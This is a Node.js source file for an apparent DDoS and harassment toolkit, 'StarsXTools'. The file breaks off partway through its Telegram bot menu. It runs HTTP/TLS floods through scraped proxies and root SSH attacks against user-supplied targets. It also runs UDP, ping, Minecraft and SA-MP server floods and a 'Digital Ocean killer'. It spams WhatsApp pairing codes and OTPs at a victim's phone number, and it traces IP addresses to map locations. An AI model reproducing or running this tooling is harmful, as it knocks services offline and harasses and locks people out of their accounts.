#!/usr/bin/env node

const { exec, spawn  } = require('child_process')
const readline = require('readline')
const { default: makeWaSocket, useMultiFileAuthState, fetchLatestBaileysVersion } = require('@whiskeysockets/baileys');
const { parsePhoneNumberFromString } = require('libphonenumber-js');
const pino = require('pino');
const url = require('url')
const fs = require('fs')
const axios = require('axios')
const path = require('path')
const version = '5.1.7'
const TelegramBot = require('node-telegram-bot-api');

let theme = 1;
let themeQuestion = '';
let processList = [];

const permen = readline.createInterface({
  input: process.stdin,
  output: process.stdout
})
// [========================================] //
function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}
// [========================================] //
async function chTheme() {
permen.question(`
1. default
2. Knight Wolf
3. Caty
Select Theme:`, async (ntahhlah) => {
let select = parseInt(ntahhlah)
  if (select === 1) {
    theme = 1;
    console.log(`Selected 1`)
    await banner(theme);
    sigma();
  } else if (select === 2) {
    theme = 2;
    console.log(`Selected 2`)
    await banner(theme);
    sigma();
  } else if (select === 3) {
    theme = 3;
    console.log(`Selected 3`)
    await banner(theme);
    sigma();
  } else {
    console.log(`Invalid Input`)
    sigma();
  }
})};
// [========================================] //
async function checkSessionAge() {
  const filePath = path.join(__dirname, '/lib/sessions.json');
  if (!fs.existsSync(filePath)) {
      return false;
  }

      const data = await fs.readFileSync(filePath, 'utf8');
      const session = JSON.parse(data);
      const loginTime = new Date(session.loginTime);
      const currentTime = new Date();

      const diffHours = Math.abs(currentTime - loginTime) / 36e5;

      if (diffHours > 4) {
        return false;
            } else {
          updateSessionFile();
          return true;
      }
}
// [========================================] //
async function updateSessionFile() {
  const filePath = path.join(__dirname, '/lib/sessions.json');
  const currentTime = new Date().toISOString();
  try {
      await fs.writeFileSync(filePath, JSON.stringify({ loginTime: currentTime }, null, 2), 'utf8');
  } catch (err) {
      console.error('Error updating session file:', err);
  }
}
// [========================================] //

async function askQuestion(query) {
  return new Promise((resolve) => {
    permen.question(query, resolve);
  });
}

async function flNotif() {
  const ntahhh = await askQuestion('Input Target Number:');
  const phoneNumber = ntahhh.replace(/\D/g, '');

  const dur = await askQuestion('Input Duration:');
  const duration = parseInt(dur, 10);

  if (isNaN(duration) || duration <= 0) {
    console.log('Invalid duration input. Please enter a positive number.');
    return;
  }

  async function startFlooder() {
    try {
      const { version } = await fetchLatestBaileysVersion();
      const { state, saveState } = await useMultiFileAuthState('sessions');
      const logger = pino({ level: 'silent' });
      const conn = makeWASocket({
        printQRInTerminal: false,
        auth: state,
        version: version,
        logger: logger,
      });

      console.log('Attack Started');

      let intervalId = setInterval(async () => {
        try {
          const pairingCode = await conn.requestPairingCode(phoneNumber);
          const formattedCode = pairingCode?.match(/.{1,4}/g)?.join('-') || pairingCode;
          console.log(`[${new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' })}] ${formattedCode} \x1b[32;1mPermenMD WhatsApp Flooder\x1b[0m`);
        } catch (error) {
          console.log(error);
        }
      }, 1000);

      setTimeout(() => {
        clearInterval(intervalId);
        console.log('Flooding stopped.');
        sigma();
      }, duration * 1000);

    } catch (error) {
      console.log(error);
    }
  }

  startFlooder();
}
  // [========================================] //
async function banner(theme) {
  if (theme === 1) {
themeQuestion = '[\x1b[1m\x1b[32mPermenMD Console\x1b[0m]: \n';
console.clear()
console.log(`
          _______  
         /       /
___     /   ____/   
:   :  /   /:        
 :   :/___/  :        
  :       :   :        
   :_______:   :    StarsXTools ${version}
           /   /    Owner: PermenMD
          /   /     Premium: true
          :  /      WhatsApp: 6285732351432
           :/       Telegram: @StarsXPermen_MD
                    Portable Tools DDoS By PermenMD
========================================================================`)

  } else if (theme === 2) {
console.clear()
themeQuestion = '[\x1b[1m\x1b[31mroot@user\x1b[0m]: \n';
console.log(`▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░░░░░░░░░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
▒▒▒▒▒▒▒▒▒▒▒▒▒░░░░░░░░░░░░░░░░░░░▒▒▒▒▒▒▒▒▒▒▒▒
▒▒▒▒▒▒▒▒▒▒░░░░░░░░░░░░░░░░░░░░░░░░░▒▒▒▒▒▒▒▒▒
▒▒▒▒▒▒▒▒░░░░░░░░░░░░░░░░░░░░░░░░░░░░░▒▒▒▒▒▒▒
▒▒▒▒▒▒░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░▄░░▒▒▒▒▒
▒▒▒▒▒░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░██▌░░▒▒▒▒
▒▒▒▒░░░░░░░░░░░░░░░░░░░░░░░░░░░▄▄███▀░░░░▒▒▒
▒▒▒░░░░░░░░░░░░░░░░░░░░░░░░░░░█████░▄█░░░░▒▒
▒▒░░░░░░░░░░░░░░░░░░░░░░░░░░▄████████▀░░░░▒▒
▒▒░░░░░░░░░░░░░░░░░░░░░░░░▄█████████░░░░░░░▒
▒░░░░░░░░░░░░░░░░░░░░░░░░░░▄███████▌░░░░░░░▒
▒░░░░░░░░░░░░░░░░░░░░░░░░▄█████████░░░░░░░░▒
▒░░░░░░░░░░░░░░░░░░░░░▄███████████▌░░░░░░░░▒
▒░░░░░░░░░░░░░░░▄▄▄▄██████████████▌░░░░░░░░▒
▒░░░░░░░░░░░▄▄███████████████████▌░░░░░░░░░▒
▒░░░░░░░░░▄██████████████████████▌░░░░░░░░░▒
▒░░░░░░░░████████████████████████░░░░░░░░░░▒
▒█░░░░░▐██████████▌░▀▀███████████░░░░░░░░░░▒
▐██░░░▄██████████▌░░░░░░░░░▀██▐█▌░░░░░░░░░▒▒
▒██████░█████████░░░░░░░░░░░▐█▐█▌░░░░░░░░░▒▒
▒▒▀▀▀▀░░░██████▀░░░░░░░░░░░░▐█▐█▌░░░░░░░░▒▒▒
▒▒▒▒▒░░░░▐█████▌░░░░░░░░░░░░▐█▐█▌░░░░░░░▒▒▒▒
▒▒▒▒▒▒░░░░███▀██░░░░░░░░░░░░░█░█▌░░░░░░▒▒▒▒▒
▒▒▒▒▒▒▒▒░▐██░░░██░░░░░░░░▄▄████████▄▒▒▒▒▒▒▒▒StarsXTools ${version}
▒▒▒▒▒▒▒▒▒██▌░░░░█▄░░░░░░▄███████████████████Owner: PermenMD
▒▒▒▒▒▒▒▒▒▐██▒▒░░░██▄▄███████████████████████Premium: true
▒▒▒▒▒▒▒▒▒▒▐██▒▒▄████████████████████████████WhatsApp: 6285732351432
▒▒▒▒▒▒▒▒▒▒▄▄████████████████████████████████Telegram: @StarsXPermen_MD
████████████████████████████████████████████Portable Tools DDoS By PermenMD
========================================================================`)
  } else if (theme === 3) {
console.clear()
themeQuestion = '[\x1b[1m\x1b[34mControl Command\x1b[0m]: \n';
console.log(`████████████████████████████████████████
██████████████─────────────█████████████
███████████───────────────────██████████
█████████───────────────────────████████
███████─────██─────────────██─────██████
██████─────████───────────████─────█████
█████─────██████─────────█████──────████
████──────██████────────███████──────███
███──────██████████████████████──────███
███──────███─────███████─────███──────██
██───────█─────█───███───█─────█──────██
██──────██─────█────█────█─────██─────██
██──────█──────█────█────█─────██─────██
███─────██─────█────█────█─────██─────██
███─▄▄▄▄███────█───███───█────███▄▄▄▄─██
████─▄▄▄▄████────███████────████▄▄▄▄─███
████─▄▄▄▄▄▄███████████████████▄▄▄▄▄▄─███
█████─────────█████████████─────────████
██████─────────────███─────────────█████StarsXTools ${version}
███████────────────███────────────██████Owner: PermenMD
█████████──────────███──────────████████Premium: true
███████████───────█████───────██████████WhatsApp: 6285732351432
██████████████────█████────█████████████Telegram: @StarsXPermen_MD
████████████████████████████████████████Portable Tools DDoS By PermenMD
========================================================================`)
  } else {
console.clear()
themeQuestion = '[\x1b[1m\x1b[32mPermenMD Console\x1b[0m]: \n';
console.log(`
          _______  
         /       /
___     /   ____/   
:   :  /   /:        
 :   :/___/  :        
  :       :   :        
   :_______:   :    StarsXTools ${version}
           /   /    Owner: PermenMD
          /   /     Premium: true
          :  /      WhatsApp: 6285732351432
           :/       Telegram: @StarsXPermen_MD
                    Portable Tools DDoS By PermenMD
========================================================================`)
  }
}
// [========================================] //
async function scrapeProxy() {
  try {
    const response = await fetch('https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt');
    const data = await response.text();
    fs.writeFileSync('proxy.txt', data, 'utf-8');
  } catch (error) {
    console.error(`Error fetching data: ${error.message}`);
  }
}
// [========================================] //
async function scrapeUserAgent() {
  try {
    const response = await fetch('https://gist.githubusercontent.com/pzb/b4b6f57144aea7827ae4/raw/cf847b76a142955b1410c8bcef3aabe221a63db1/user-agents.txt');
    const data = await response.text();
    fs.writeFileSync('ua.txt', data, 'utf-8');
  } catch (error) {
    console.error(`Error fetching data: ${error.message}`);
  }
}
// [========================================] //
function clearProxy() {
  if (fs.existsSync('proxy.txt')) {
    fs.unlinkSync('proxy.txt');
  }
}
// [========================================] //
function clearUserAgent() {
  if (fs.existsSync('ua.txt')) {
    fs.unlinkSync('ua.txt');
  }
}
// [========================================] //
async function bootup() {
  try {
      console.log('|| ▓░░░░░░░░░ || 10%');
      await exec('npm i axios tls http2 hpack net cluster crypto ssh2 dgram @whiskeysockets/baileys libphonenumber-js chalk gradient-string pino mineflayer proxy-agent')
      console.log('|| ▓▓░░░░░░░░ || 20%');
      const getLatestVersion = await fetch('https://raw.githubusercontent.com/permenmd/cache/main/version.txt');
      const latestVersion = await getLatestVersion.text();
      console.log('|| ▓▓▓░░░░░░░ || 30%');
      if (version === latestVersion.trim()) {
          console.log('|| ▓▓▓▓▓▓░░░░ || 60%');
          const secretBangetJir = await fetch('https://raw.githubusercontent.com/permenmd/cache/main/sigma.txt');
          const password = await secretBangetJir.text();
          const SessionsTest = await checkSessionAge();
          if (SessionsTest === true) {
              console.log('Already Logged');
              await scrapeProxy();
              console.log('|| ▓▓▓▓▓▓▓░░░ || 70%');
              await scrapeUserAgent();
              console.log('|| ▓▓▓▓▓▓▓▓▓▓ || 100%');
              await sleep(700);
              console.clear();
              console.log(`Welcome To PermenMD Tools ${version}`);
              await sleep(1000);
              await banner();
              console.log('Type "help" For Showing All Available Command');
              sigma();
          } else if (SessionsTest === false) {
              console.log('Login Key Required');
              permen.question('[\x1b[1m\x1b[31mPermenMD Security\x1b[0m]: \n', async (skibidi) => {
                  if (skibidi === password.trim()) {
                      console.log('Successfully Logged');
                      await updateSessionFile();
                      await scrapeProxy();
                      console.log('|| ▓▓▓▓▓▓▓░░░ || 70%');
                      await scrapeUserAgent();
                      console.log('|| ▓▓▓▓▓▓▓▓▓▓ || 100%');
                      await sleep(700);
                      console.clear();
                      console.log(`Welcome To PermenMD Tools ${version}`);
                      await sleep(1000);
                      await banner();
                      console.log('Type "help" For Showing All Available Command');
                      sigma();
                  } else {
                      console.log('Wrong Key');
                      process.exit(-1);
                  }
              });
          } else {
            console.log(`ntah`)
          }
      } else {
          console.log(`This Version Is Outdated. ${version} => ${latestVersion.trim()}`);
          process.exit();
      }
  } catch (error) {
      console.log('Are You Online?');
      console.error(error);
  }
}

// [========================================] //
async function killWifi() {
const wifiPath = path.join(__dirname, `/lib/cache/StarsXWiFi`);
const startKillwiFi = spawn('node', [wifiPath]);
console.log(`
WiFi Killer Has Started
Type exit To Stop
`);
permen.question('[\x1b[1m\x1b[31mPermenMD Wifi Killer\x1b[0m]: \n', async (yakin) => {
if (yakin === 'exit') {
  startKillwiFi.kill('SIGKILL')
  console.log(`WiFi Killer Has Ended`)
  sigma()
} else {
  console.log(`do you mean 'exit'?`)
  sigma()
}})
}
// [========================================] //
async function trackIP(args) {
  if (args.length < 1) {
    console.log(`Example: track-ip <ip address>
track-ip 1.1.1.1`);
    sigma();
	return
  }
const [target] = args
  if (target === '0.0.0.0') {
  console.log(`Jangan Di Ulangi Manis Nanti Di Delete User Mu`)
	sigma()
  } else {
    try {
const apiKey = '8fd0a436e74f44a7a3f94edcdd71c696';
const response = await fetch(`https://api.ipgeolocation.io/ipgeo?apiKey=${apiKey}&ip=${target}`);
const res = await fetch(`https://ipwho.is/${target}`);
const additionalInfo = await res.json();
const ipInfo = await response.json();

    console.clear()
    console.log(`
██████╗ ███████╗██████╗ ███╗   ███╗███████╗███╗   ██╗███╗   ███╗██████╗
██╔══██╗██╔════╝██╔══██╗████╗ ████║██╔════╝████╗  ██║████╗ ████║██╔══██╗
██████╔╝█████╗  ██████╔╝██╔████╔██║█████╗  ██╔██╗ ██║██╔████╔██║██║  ██║
██╔═══╝ ██╔══╝  ██╔══██╗██║╚██╔╝██║██╔══╝  ██║╚██╗██║██║╚██╔╝██║██║  ██║
██║     ███████╗██║  ██║██║ ╚═╝ ██║███████╗██║ ╚████║██║ ╚═╝ ██║██████╔╝
╚═╝     ╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝╚══════╝╚═╝  ╚═══╝╚═╝     ╚═╝╚═════╝
                      Tracking IP Address Result 
========================================================================
 - Flags: ${ipInfo.country_flag}
 - Country: ${ipInfo.country_name}
 - Capital: ${ipInfo.country_capital}
 - City: ${ipInfo.city}
 - ISP: ${ipInfo.isp}
 - Organization: ${ipInfo.organization}
 - lat: ${ipInfo.latitude}
 - long: ${ipInfo.longitude}
      
 Google Maps: https://www.google.com/maps/place/${additionalInfo.latitude}+${additionalInfo.longitude}
`)
    sigma()
  } catch (error) {
      console.log(`Error Tracking ${target}`)
      sigma()
    }
    }
};
// [========================================] //
async function pushOngoing(target, methods, duration) {
  const startTime = Date.now();
  processList.push({ target, methods, startTime, duration })
  setTimeout(() => {
    const index = processList.findIndex((p) => p.methods === methods);
    if (index !== -1) {
      processList.splice(index, 1);
    }
  }, duration * 1000);
}
// [========================================] //
function ongoingAttack() {
  console.log("\nOngoing Attack:\n");
  processList.forEach((process) => {
console.log(`Target: ${process.target}
Methods: ${process.methods}
Duration: ${process.duration} Seconds
Since: ${Math.floor((Date.now() - process.startTime) / 1000)} seconds ago\n`);
  });
}
// [========================================] //
async function handleAttackCommand(args) {
  if (args.length < 3) {
    console.log(`Example: attack <target> <duration> <methods>
attack https://google.com 120 flood`);
    sigma();
	return
  }
const [target, duration, methods] = args
try {
const parsing = new url.URL(target)
const hostname = parsing.hostname
const scrape = await axios.get(`http://ip-api.com/json/${hostname}?fields=isp,query,as`)
const result = scrape.data;

console.clear()
console.log(`
██████╗ ███████╗██████╗ ███╗   ███╗███████╗███╗   ██╗███╗   ███╗██████╗
██╔══██╗██╔════╝██╔══██╗████╗ ████║██╔════╝████╗  ██║████╗ ████║██╔══██╗
██████╔╝█████╗  ██████╔╝██╔████╔██║█████╗  ██╔██╗ ██║██╔████╔██║██║  ██║
██╔═══╝ ██╔══╝  ██╔══██╗██║╚██╔╝██║██╔══╝  ██║╚██╗██║██║╚██╔╝██║██║  ██║
██║     ███████╗██║  ██║██║ ╚═╝ ██║███████╗██║ ╚████║██║ ╚═╝ ██║██████╔╝
╚═╝     ╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝╚══════╝╚═╝  ╚═══╝╚═╝     ╚═╝╚═════╝
                      Attack Has Been Launched
========================================================================
Target   : ${target}
Duration : ${duration}
Methods  : ${methods}
ISP      : ${result.isp}
Ip       : ${result.query}
AS       : ${result.as}
`)
} catch (error) {
  console.log(`Oops Something Went wrong`)
}
const metode = path.join(__dirname, `/lib/cache/${methods}`);
  if (methods === 'flood') {
   pushOngoing(target, methods, duration)
   exec(`node ${metode} ${target} ${duration}`)
	sigma()
  } else if (methods === 'tls') {
    pushOngoing(target, methods, duration)
     exec(`node ${metode} ${target} ${duration} 100 10`)
    sigma()
    } else if (methods === 'strike') {
      pushOngoing(target, methods, duration)
       exec(`node ${metode} GET ${target} ${duration} 10 90 proxy.txt --full`)
      sigma()
      } else if (methods === 'kill') {
       pushOngoing(target, methods, duration)
        exec(`node ${metode} ${target} ${duration} 100 10`)
        sigma()
        } else if (methods === 'bypass') {
       pushOngoing(target, methods, duration)
        exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`)
          sigma()
          } else if (methods === 'raw') {
       pushOngoing(target, methods, duration)
        exec(`node ${metode} ${target} ${duration}`)
          sigma()
          } else if (methods === 'thunder') {
       pushOngoing(target, methods, duration)
        exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`)
          sigma()
          } else if (methods === 'rape') {
       pushOngoing(target, methods, duration)
        exec(`node ${metode} ${duration} 10 proxy.txt 70 ${target}`)
          sigma()
          } else if (methods === 'storm') {
       pushOngoing(target, methods, duration)
        exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`)
          sigma()
          } else if (methods === 'destroy') {
       pushOngoing(target, methods, duration)
        exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`)
          sigma()
          } else if (methods === 'slim') {
       pushOngoing(target, methods, duration)
const destroy = path.join(__dirname, `/lib/cache/destroy`);
const storm = path.join(__dirname, `/lib/cache/storm`);
const rape = path.join(__dirname, `/lib/cache/rape`);
        exec(`node ${destroy} ${target} ${duration} 100 1 proxy.txt`)
        exec(`node ${storm} ${target} ${duration} 100 1 proxy.txt`)
        exec(`node ${rape} ${duration} 1 proxy.txt 70 ${target}`)
          sigma()
          } else {
    console.log(`Method ${methods} not recognized.`);
  }
};
// [========================================] //
async function killSSH(args) {
  if (args.length < 2) {
    console.log(`Example: kill-ssh <target> <duration>
kill-ssh 123.456.789.10 120 flood`);
    sigma();
	return
  }
const [target, duration] = args
try {
const scrape = await axios.get(`http://ip-api.com/json/${target}?fields=isp,query,as`)
const result = scrape.data;

console.clear()
console.log(`
██████╗ ███████╗██████╗ ███╗   ███╗███████╗███╗   ██╗███╗   ███╗██████╗
██╔══██╗██╔════╝██╔══██╗████╗ ████║██╔════╝████╗  ██║████╗ ████║██╔══██╗
██████╔╝█████╗  ██████╔╝██╔████╔██║█████╗  ██╔██╗ ██║██╔████╔██║██║  ██║
██╔═══╝ ██╔══╝  ██╔══██╗██║╚██╔╝██║██╔══╝  ██║╚██╗██║██║╚██╔╝██║██║  ██║
██║     ███████╗██║  ██║██║ ╚═╝ ██║███████╗██║ ╚████║██║ ╚═╝ ██║██████╔╝
╚═╝     ╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝╚══════╝╚═╝  ╚═══╝╚═╝     ╚═╝╚═════╝
                    SSH Killer Has Been Launched
========================================================================
Target   : ${target}
Duration : ${duration}
ISP      : ${result.isp}
Ip       : ${result.query}
AS       : ${result.as}
`)
} catch (error) {
  console.log(`Oops Something Went Wrong`)
}

const metode = path.join(__dirname, `/lib/cache/StarsXSSH`);
exec(`node ${metode} ${target} 22 root ${duration}`)
sigma()
};
// [========================================] //
async function killOTP(args) {
  if (args.length < 2) {
    console.log(`Example: kill-otp <target> <duration>
kill-otp 628xxx 120`);
    sigma();
	return
  }
const [target, duration] = args
try {
console.clear()
console.log(`
██████╗ ███████╗██████╗ ███╗   ███╗███████╗███╗   ██╗███╗   ███╗██████╗
██╔══██╗██╔════╝██╔══██╗████╗ ████║██╔════╝████╗  ██║████╗ ████║██╔══██╗
██████╔╝█████╗  ██████╔╝██╔████╔██║█████╗  ██╔██╗ ██║██╔████╔██║██║  ██║
██╔═══╝ ██╔══╝  ██╔══██╗██║╚██╔╝██║██╔══╝  ██║╚██╗██║██║╚██╔╝██║██║  ██║
██║     ███████╗██║  ██║██║ ╚═╝ ██║███████╗██║ ╚████║██║ ╚═╝ ██║██████╔╝
╚═╝     ╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝╚══════╝╚═╝  ╚═══╝╚═╝     ╚═╝╚═════╝
                    OTP Killer Has Been Launched
========================================================================
Target   : ${target}
Duration : ${duration}

Spamming WhatsApp OTP That Can Annoy Someone Or Maybe Make Them Cannot Login`)
} catch (error) {
  console.log(`Oops Something Went Wrong`)
}

const metode = path.join(__dirname, `/lib/cache/StarsXTemp`);
exec(`node ${metode} +${target} ${duration}`)
sigma()
};
// [========================================] //
async function killDo(args) {
  if (args.length < 2) {
    console.log(`Example: kill-do <target> <duration>
kill-do 123.456.78.910 300`);
    sigma();
	return
  }
const [target, duration] = args
try {
console.clear()
console.log(`
██████╗ ███████╗██████╗ ███╗   ███╗███████╗███╗   ██╗███╗   ███╗██████╗
██╔══██╗██╔════╝██╔══██╗████╗ ████║██╔════╝████╗  ██║████╗ ████║██╔══██╗
██████╔╝█████╗  ██████╔╝██╔████╔██║█████╗  ██╔██╗ ██║██╔████╔██║██║  ██║
██╔═══╝ ██╔══╝  ██╔══██╗██║╚██╔╝██║██╔══╝  ██║╚██╗██║██║╚██╔╝██║██║  ██║
██║     ███████╗██║  ██║██║ ╚═╝ ██║███████╗██║ ╚████║██║ ╚═╝ ██║██████╔╝
╚═╝     ╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝╚══════╝╚═╝  ╚═══╝╚═╝     ╚═╝╚═════╝
                    VPS Killer Has Been Launched
========================================================================
Target   : ${target}
Duration : ${duration}
Methods  : Digital Ocean Killer
Creator  : PermenMD`)
} catch (error) {
  console.log(`Oops Something Went Wrong`)
}
const raw = path.join(__dirname, `/lib/cache/raw`);
const flood = path.join(__dirname, `/lib/cache/flood`);
const ssh = path.join(__dirname, `/lib/cache/StarsXSSH`);
exec(`node ${ssh} ${target} 22 root ${duration}`)
exec(`node ${flood} https://${target} ${duration}`)
exec(`node ${raw} http://${target} ${duration}`)
sigma()
};
// [========================================] //
async function udp_flood(args) {
  if (args.length < 3) {
    console.log(`Example: udp-raw <target> <port> <duration>
udp-raw 123.456.78.910 53 300`);
    sigma();
	return
  }
const [target, port, duration] = args
try {
console.clear()
console.log(`
██████╗ ███████╗██████╗ ███╗   ███╗███████╗███╗   ██╗███╗   ███╗██████╗
██╔══██╗██╔════╝██╔══██╗████╗ ████║██╔════╝████╗  ██║████╗ ████║██╔══██╗
██████╔╝█████╗  ██████╔╝██╔████╔██║█████╗  ██╔██╗ ██║██╔████╔██║██║  ██║
██╔═══╝ ██╔══╝  ██╔══██╗██║╚██╔╝██║██╔══╝  ██║╚██╗██║██║╚██╔╝██║██║  ██║
██║     ███████╗██║  ██║██║ ╚═╝ ██║███████╗██║ ╚████║██║ ╚═╝ ██║██████╔╝
╚═╝     ╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝╚══════╝╚═╝  ╚═══╝╚═╝     ╚═╝╚═════╝
                    UDP Raw Flood Attack Launched
========================================================================
Target   : ${target}
Duration : ${duration}
Methods  : UDP Raw
Creator  : PermenMD`)
} catch (error) {
  console.log(`Oops Something Went Wrong`)
}

const metode = path.join(__dirname, `/lib/cache/udp`);
exec(`node ${metode} ${target} ${port} ${duration}`)
sigma()
};
// [========================================] //
async function mcbot(args) {
  if (args.length < 3) {
    console.log(`Example: .mc-flood <target> <port> <duration>
mc-flood 123.456.78.910 25565 300`);
    sigma();
	return
  }
const [target, port, duration] = args
try {
console.clear()
console.log(`
██████╗ ███████╗██████╗ ███╗   ███╗███████╗███╗   ██╗███╗   ███╗██████╗
██╔══██╗██╔════╝██╔══██╗████╗ ████║██╔════╝████╗  ██║████╗ ████║██╔══██╗
██████╔╝█████╗  ██████╔╝██╔████╔██║█████╗  ██╔██╗ ██║██╔████╔██║██║  ██║
██╔═══╝ ██╔══╝  ██╔══██╗██║╚██╔╝██║██╔══╝  ██║╚██╗██║██║╚██╔╝██║██║  ██║
██║     ███████╗██║  ██║██║ ╚═╝ ██║███████╗██║ ╚████║██║ ╚═╝ ██║██████╔╝
╚═╝     ╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝╚══════╝╚═╝  ╚═══╝╚═╝     ╚═╝╚═════╝
                   Minecraft Flood Attack Launched
========================================================================
Target   : ${target}
Duration : ${duration}
Methods  : Minecraft Flooder
Creator  : PermenMD`)
} catch (error) {
  console.log(`Oops Something Went Wrong`)
    sigma()
}

const metode = path.join(__dirname, `/lib/cache/StarsXMc`);
exec(`node ${metode} ${target} ${port} ${duration}`)
sigma()
};
// [========================================] //
async function samp(args) {
  if (args.length < 3) {
    console.log(`Example: .samp <target> <port> <duration>
samp 123.456.78.910 7777 300`);
    sigma();
	return
  }
const [target, port, duration] = args
try {
console.clear()
console.log(`
██████╗ ███████╗██████╗ ███╗   ███╗███████╗███╗   ██╗███╗   ███╗██████╗
██╔══██╗██╔════╝██╔══██╗████╗ ████║██╔════╝████╗  ██║████╗ ████║██╔══██╗
██████╔╝█████╗  ██████╔╝██╔████╔██║█████╗  ██╔██╗ ██║██╔████╔██║██║  ██║
██╔═══╝ ██╔══╝  ██╔══██╗██║╚██╔╝██║██╔══╝  ██║╚██╗██║██║╚██╔╝██║██║  ██║
██║     ███████╗██║  ██║██║ ╚═╝ ██║███████╗██║ ╚████║██║ ╚═╝ ██║██████╔╝
╚═╝     ╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝╚══════╝╚═╝  ╚═══╝╚═╝     ╚═╝╚═════╝
                    SA MP Flood Attack Launched
========================================================================
Target   : ${target}
Duration : ${duration}
Methods  : SAMP Flooder
Creator  : PermenMD`)
} catch (error) {
  console.log(`Oops Something Went Wrong`)
    sigma()
}
const metode = path.join(__dirname, `/lib/cache/StarsXSamp`);
exec(`node ${metode} ${target} ${port} ${duration}`)
sigma()
};
// [========================================] //
async function pod(args) {
  if (args.length < 3) {
    console.log(`Example: .kill-ping <target> <duration>
kill-ping 123.456.78.910 300`);
    sigma();
	return
  }
const [target, duration] = args
try {
console.clear()
console.log(`
██████╗ ███████╗██████╗ ███╗   ███╗███████╗███╗   ██╗███╗   ███╗██████╗
██╔══██╗██╔════╝██╔══██╗████╗ ████║██╔════╝████╗  ██║████╗ ████║██╔══██╗
██████╔╝█████╗  ██████╔╝██╔████╔██║█████╗  ██╔██╗ ██║██╔████╔██║██║  ██║
██╔═══╝ ██╔══╝  ██╔══██╗██║╚██╔╝██║██╔══╝  ██║╚██╗██║██║╚██╔╝██║██║  ██║
██║     ███████╗██║  ██║██║ ╚═╝ ██║███████╗██║ ╚████║██║ ╚═╝ ██║██████╔╝
╚═╝     ╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝╚══════╝╚═╝  ╚═══╝╚═╝     ╚═╝╚═════╝
                    Ping Kill Attack Launched
========================================================================
Target   : ${target}
Duration : ${duration}
Methods  : kill-ping
Creator  : PermenMD`)
} catch (error) {
  console.log(`Oops Something Went Wrong`)
    sigma()
}
const metode = path.join(__dirname, `/lib/cache/ping`);
exec(`node ${metode} ${target} 65500 10 10 ${duration}`)
sigma()
};
// [========================================] //
async function subdomen(args) {
  if (args.length < 1) {
    console.log(`Example: .subdo-finder domain
.subdo-finder starsx.tech`);
    sigma();
	return
  }
const [domain] = args
try {
let response = await axios.get(`https://api.agatz.xyz/api/subdomain?url=${domain}`);
let hasilmanuk = response.data.data.map((data, index) => {
return `${data}`;
}).join('\n');
console.clear()
console.log(`
██████╗ ███████╗██████╗ ███╗   ███╗███████╗███╗   ██╗███╗   ███╗██████╗
██╔══██╗██╔════╝██╔══██╗████╗ ████║██╔════╝████╗  ██║████╗ ████║██╔══██╗
██████╔╝█████╗  ██████╔╝██╔████╔██║█████╗  ██╔██╗ ██║██╔████╔██║██║  ██║
██╔═══╝ ██╔══╝  ██╔══██╗██║╚██╔╝██║██╔══╝  ██║╚██╗██║██║╚██╔╝██║██║  ██║
██║     ███████╗██║  ██║██║ ╚═╝ ██║███████╗██║ ╚████║██║ ╚═╝ ██║██████╔╝
╚═╝     ╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝╚══════╝╚═╝  ╚═══╝╚═╝     ╚═╝╚═════╝
                        Subdomains Finder
========================================================================
${hasilmanuk}`)
} catch (error) {
  console.log(`Oops Something Went Wrong`)
  sigma()
}
sigma()
};
// [========================================] //
async function chat_ai() {
permen.question('[\x1b[1m\x1b[31mPermenMD Chat AI\x1b[0m]: \n', async (yakin) => {
if (yakin === 'exit') {
  console.log(`Chat Ai Has Ended`)
  sigma()
} else {
  try {
let skidie = await axios.get(`https://api.agatz.xyz/api/ragbot?message=${yakin}`)
let kiddies = await skidie.data
console.log(`
[ Ragbot ]:
${kiddies.data}
`)
  } catch (error) {
      console.log(error)
  }
  chat_ai()
}})
}
// [==================================================================================] //
async function transformBot(theme) {
  permen.question('Insert Your Telegram Token: ', (telegramToken) => {
    permen.question('Insert Your Telegram ID: ', (telegramId) => {
      const permenTGBot = new TelegramBot(telegramToken, { polling: true });
      
      console.clear();
      console.log(`Successfully Connected With:\nBot Token:\t${telegramToken}\nChat ID:\t${telegramId}`);

      const mainMenu = {
        parse_mode: 'Markdown',
        reply_markup: {
          inline_keyboard: [
            [
              { text: 'Flood Notification', callback_data: 'flood_notif' },
              { text: 'Subdomain Finder', callback_data: 'subdo_finder' }
            ],
            [
              { text: 'Kill OTP', callback_data: 'kill_otp' },
              { text: 'Kill SSH', callback_data: 'kill_ssh' }
            ],
            [
              { text: 'Kill PING', callback_data: 'kill_ping' },
              { text: 'Killer Digital Ocean', callback_data: 'kill_do' }
            ],
            [
              { text: 'Attack', callback_data: 'start_attack' }
            ],
            [
              { text: 'Main Menu', callback_data: 'main_start' }
            ],
            [
              { text: 'Back CLI', callback_data: 'back_cli' }
            ]
          ]
        }
      };

      const methodsList = {
        reply_markup: {
          keyboard: [
            [{ text: 'Flood' }, { text: 'Tls' }],
            [{ text: 'Strike' }, { text: 'Kill' }],
            [{ text: 'Bypass' }, { text: 'Thunder' }],
            [{ text: 'Storm' }, { text: 'Rape' }],
            [{ text: 'Slim' }, { text: 'Destroy' }],
            [{ text: 'Raw' }]
          ],
          resize_keyboard: true,
          one_time_keyboard: true
        }
      };
      
      const extendLimau = {
        parse_mode: 'Markdown',
        reply_markup: {
          inline_keyboard: [
            [
